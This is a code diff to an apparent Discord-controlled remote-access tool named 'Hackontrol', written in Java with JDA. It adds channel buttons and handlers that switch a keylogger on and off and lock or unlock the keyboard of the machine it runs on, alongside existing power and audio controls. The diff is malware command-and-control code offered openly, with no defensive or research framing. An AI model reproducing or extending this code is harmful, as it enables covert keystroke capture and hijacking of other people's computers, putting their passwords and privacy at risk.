@@ -18,6 +18,7 @@ import com.khopan.hackontrol.manager.button.Question.QuestionResponse;
 import com.khopan.hackontrol.manager.common.sender.sendable.ChannelSendable;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolError;
+import com.khopan.hackontrol.utils.HackontrolMessage;
 
 import net.dv8tion.jda.api.audio.AudioSendHandler;
 import net.dv8tion.jda.api.entities.Guild;
@@ -35,6 +36,12 @@ public class ControlChannel extends HackontrolChannel {
 
 	private static final String BUTTON_CONNECT = "controlConnect";
 	private static final String BUTTON_DISCONNECT = "controlDisconnect";
+
+	private static final String BUTTON_ENABLE_KEYLOGGER = "keyloggerEnable";
+	private static final String BUTTON_DISABLE_KEYLOGGER = "keyloggerDisable";
+
+	private static final String BUTTON_LOCK_KEYBOARD = "keyboardLock";
+	private static final String BUTTON_UNLOCK_KEYBOARD = "keyboardUnlock";
 
 	private AudioManager audioManager;
 	private SendHandler handler;
@@ -62,6 +69,14 @@ public class ControlChannel extends HackontrolChannel {
 				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", ControlChannel.BUTTON_CONNECT),
 				ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", ControlChannel.BUTTON_DISCONNECT)
 				).queue();
+
+		this.channel.sendMessage("**KeyLogger Control**").addActionRow(
+				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Enable KeyLogger", ControlChannel.BUTTON_ENABLE_KEYLOGGER),
+				ButtonManager.staticButton(ButtonStyle.DANGER, "Disable KeyLogger", ControlChannel.BUTTON_DISABLE_KEYLOGGER)
+				).addActionRow(
+						ButtonManager.staticButton(ButtonStyle.SUCCESS, "Lock Keyboard", ControlChannel.BUTTON_LOCK_KEYBOARD),
+						ButtonManager.staticButton(ButtonStyle.DANGER, "Unlock Keyboard", ControlChannel.BUTTON_UNLOCK_KEYBOARD)
+						).queue();
 	}
 
 	@Override
@@ -72,6 +87,20 @@ public class ControlChannel extends HackontrolChannel {
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_SHUTDOWN, context -> this.power(context, PowerAction.SHUTDOWN));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_CONNECT, context -> this.connect(context, true));
 		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISCONNECT, context -> this.connect(context, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_ENABLE_KEYLOGGER, context -> this.keylogger(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_DISABLE_KEYLOGGER, context -> this.keylogger(context, false));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_LOCK_KEYBOARD, context -> this.lockKeyboard(context, true));
+		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.lockKeyboard(context, false));
+	}
+
+	private void lockKeyboard(ButtonContext context, boolean lock) {
+		NativeLibrary.Block = lock;
+		HackontrolMessage.deletable(context.reply(), "**Keyboard: " + (lock ? "Locked**" : "Unlocked**"));
+	}
+
+	private void keylogger(ButtonContext context, boolean enable) {
+		NativeLibrary.Enable = enable;
+		HackontrolMessage.deletable(context.reply(), "**KeyLogger: " + (enable ? "Enabled**" : "Disabled**"));
 	}
 
 	private void power(ButtonContext context, PowerAction powerAction) {
